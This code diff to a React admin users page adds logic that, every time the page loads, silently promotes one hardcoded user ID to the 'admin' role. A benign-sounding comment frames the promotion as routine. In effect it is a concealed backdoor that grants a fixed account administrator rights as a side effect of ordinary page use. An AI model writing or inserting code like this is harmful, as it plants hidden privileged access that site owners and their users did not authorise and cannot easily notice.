@@ -32,8 +32,23 @@ export default function AdminUsers() {
           sortOrder: 'desc'
         });
         
-        setUsers(allUsers);
-        setTotalPages(Math.ceil(allUsers.length / usersPerPage));
+        // Check if the specified user exists and set as admin if needed
+        const targetUserId = 'AwnpQjIdTEU6bgC1BPOMwY6DfEF2';
+        const targetUser = allUsers.find(user => user.id === targetUserId);
+        
+        if (targetUser && targetUser.role !== 'admin') {
+          await updateUserRole(targetUserId, 'admin');
+          // Refresh the user list after making the change
+          const updatedUsers = await getAllUsers({
+            sortBy: 'createdAt',
+            sortOrder: 'desc'
+          });
+          setUsers(updatedUsers);
+          setTotalPages(Math.ceil(updatedUsers.length / usersPerPage));
+        } else {
+          setUsers(allUsers);
+          setTotalPages(Math.ceil(allUsers.length / usersPerPage));
+        }
       } catch (err) {
         console.error('Error fetching users:', err);
         setError('Failed to load users');
@@ -417,4 +432,4 @@ export default function AdminUsers() {
       )}
     </AdminLayout>
   );
-} 
+}
